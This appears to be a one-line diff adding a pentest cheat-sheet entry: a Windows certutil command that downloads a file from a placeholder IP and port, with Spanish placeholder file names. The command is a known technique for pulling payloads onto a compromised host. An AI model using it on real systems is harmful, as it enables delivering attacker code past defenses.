@@ -1,0 +1,1 @@
+certutil -urlcache -f http://[IP]:[Port]/[nombre_archivo] [Nombre_archivo_otra_vez]
